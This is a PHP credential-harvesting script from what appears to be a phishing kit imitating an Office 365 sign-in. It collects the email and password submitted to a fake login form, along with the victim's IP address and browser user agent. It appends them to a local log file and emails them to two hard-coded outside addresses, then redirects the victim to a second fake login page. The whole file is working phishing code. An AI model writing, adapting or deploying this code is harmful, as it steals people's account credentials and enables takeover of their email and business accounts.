<?php
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| RESULT Office 365 By JoCk |--------------|\n";
$message .= "|Email        		  : ".$_POST['emaill']."\n";
$message .= "|Password          : ".$_POST['psw']."\n";
$message .= "|----------| I N F O S |--------------|\n";
$message .= "|Client IP: ".$ip."|\n";
$message .= "|User Agent: ".$useragent."|\n";
$message .= "|----------| YOUR WELCOME By JoCk|--------------|\n";
$send = "miontuirapatyuira@gmail.com,mikejohn234503@protonmail.com"; 
$subject = "RESULT Office 365 By JoCk- From:  [ $ip ]";
$file = fopen("./cool.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 
{
mail("$send", "$subject", $message);
}
header("Location: ../login365-2.php?&sessionid={$_SESSION['randString']}&sslmode=true");
?>


